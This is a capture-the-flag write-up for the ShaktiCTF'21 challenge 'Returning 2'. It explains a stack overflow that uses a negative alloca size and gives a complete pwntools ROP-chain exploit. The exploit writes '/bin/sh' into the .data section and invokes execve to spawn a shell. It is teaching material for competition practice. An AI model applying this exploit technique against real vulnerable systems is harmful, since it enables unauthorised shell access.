# ShaktiCTF'21: Returning 2

Author: Shruti (@rudyerudite)

This was a fairly beginner friendly challenge with a clear 120-byte overflow. We also see an `alloca` function which is used to allocate space on the stack. I gave an allocation of `-40` so that I get the allocation at RBP. Note that PIE is diasbled here.

By using `ROPgadget` tool we can find the required ROP gadgets for crafting the exploit payload. As `'/bin/sh'` cannot be found in the binary and nor we can write it at .bss, thus we have to find and address in binary with permissions `rw`. I chose to overwrite an address in the .data section. You can see the permissions of different sections in the binary by executing `vmmap` in GDB and finding the required address. Thus, I used the `mov    QWORD PTR [rdi],rax` gadget with rax having the string `'/bin/sh'` and rdi pointing to the address `0x601040`. Next, we can do the execve syscall.

Here's the final exploit for the challenge:

``` C
from pwn import *

r = process("./chall")

pop_rax = p64(0x000000000040079a)
pop_rdx = p64(0x0000000000400788)
pop_rdi = p64(0x000000000040077f)
pop_rsi = p64(0x0000000000400791)
mov = p64(0x400774)
syscall = p64(0x00000000004007a3)

exp = 'a'*0x8
exp += pop_rdi + p64(0x0000000000601040) 
exp += pop_rax + "/bin/sh\x00"
exp += mov
exp += pop_rsi + p64(0)
exp += pop_rdx + p64(0)
exp += pop_rax + p64(0x3b) 
exp += syscall
exp += p64(0x000000000040059e)
print(len(exp))
r.sendline(str(-40))
r.sendlineafter("text:\n",exp)

r.interactive()
```